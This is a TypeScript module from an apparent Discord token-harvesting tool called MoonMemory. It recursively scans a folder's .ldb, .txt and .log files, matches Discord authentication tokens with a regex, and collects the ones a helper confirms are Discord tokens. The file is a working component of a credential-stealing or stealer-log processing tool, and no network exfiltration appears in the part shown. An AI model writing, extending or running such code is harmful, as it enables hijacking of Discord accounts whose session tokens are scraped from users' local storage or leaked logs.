import * as fs from 'fs/promises';
import * as path from 'path';
import async from 'async';
import { AsyncLoader } from '@MoonMemory/types/Loader.js';
import { LoaderInputType } from '@MoonMemory/types/LoaderInputType.js';
import { getNativeTokenInfo } from '@MoonMemory/utils/getNativeTokenInfo.js';

async function *walkAsync( dir: string ): AsyncGenerator<string>
{
	const files = await fs.readdir( dir, { withFileTypes: true } );
	for ( const file of files ) 
	{
		if ( file.isDirectory() ) yield* walkAsync( path.join( dir, file.name ) );
		else yield path.join( dir, file.name );
	}
}

async function processFile( path: string ): Promise<string[]>
{
	const data = await fs.readFile( path, 'utf8' );
	return [...data.toString().matchAll( /(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g )]
		.map( m => m[0] as string )
		.filter( ( token: string ) => token && token.length > 1 )
		.filter( ( token: string ) => getNativeTokenInfo( token ).is_discord_token );
}

export default class AsyncDirLoader implements AsyncLoader
{
	inputType = LoaderInputType.Directory;
	name = 'Асинхронный лоадер (Папки)';

	async load( source: string ): Promise<string[]>
	{
		let filelist: string[] = [];
		const tokens: string[] = [];

		for await ( const file of walkAsync( source ) ) filelist.push( file );
		filelist = filelist.filter( ( file: string ) => ['.ldb', '.txt', '.log'].includes( path.extname( file ) ) );
		return new Promise( ( resolve, reject ) => 
		{
			async.eachLimit( filelist, 10, async ( filePath ) =>
			{
				try { tokens.push( ...( await processFile( filePath ) ) ); }
				catch ( error ) { reject( error ); }
			}, ( error ) => 
			{ error ? reject( error ) : resolve( tokens ); } );
		} );
	}
	
}